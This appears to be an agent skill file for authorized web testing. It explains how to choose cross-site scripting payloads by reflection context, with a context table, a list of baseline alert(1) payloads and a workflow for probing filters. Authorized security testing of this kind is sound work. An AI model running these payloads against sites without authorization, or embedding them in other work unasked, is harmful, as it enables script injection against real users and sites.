---
name: xss-payload-selection
description: Select the most effective XSS payload based on the injection context (HTML body, attribute, JavaScript block, URL). Use when the user is testing for reflected, stored, or DOM-based XSS on an authorized target and needs a context-appropriate proof-of-concept.
---

# XSS Payload Selection by Context

Pick a payload that matches **where** the input is reflected in the response. The wrong context = no execution.

## Context decision table

| Reflection context | Try first | Fallback |
|---|---|---|
| HTML body (between tags) | `<script>alert(1)</script>` | `<img src=x onerror=alert(1)>`, `<svg onload=alert(1)>` |
| Tag attribute value (quoted) | Break out: `" onmouseover=alert(1) x="` | `' autofocus onfocus=alert(1) x='` |
| Tag attribute (unquoted) | ` onmouseover=alert(1) ` | ` onfocus=alert(1) autofocus ` |
| `href` / `src` attribute | `javascript:alert(1)` | `data:text/html,<script>alert(1)</script>` |
| Inside `<script>` string | `';alert(1);//` | `";alert(1);//` |
| Inside `<script>` (no quotes around sink) | `alert(1)` directly | `-alert(1)-` |
| Inside HTML comment | `--><script>alert(1)</script>` | `--><svg onload=alert(1)>` |
| Inside `<style>` | `</style><script>alert(1)</script>` | `expression(alert(1))` (legacy IE) |
| Inside `<textarea>` / `<title>` | `</textarea><script>alert(1)</script>` | `</title><svg onload=alert(1)>` |

## Stable baseline payloads

```
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<details open ontoggle=alert(1)>
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
```

## Workflow

1. Submit a marker (e.g. `zxq123`) and locate every reflection in the response — view source, not rendered DOM.
2. For each reflection, identify the **context** (use table above).
3. Probe filtered characters: `<`, `>`, `"`, `'`, `(`, `)`, `/`, `;`, backtick, `=`.
4. Pick the row that matches; if the first payload is filtered, try the fallback or escalate to `xss-waf-bypass`.
5. Confirm execution with `alert(1)` or a unique callback. Never use destructive payloads on a PoC.

## Ethics

Only test systems you have written authorization to test.
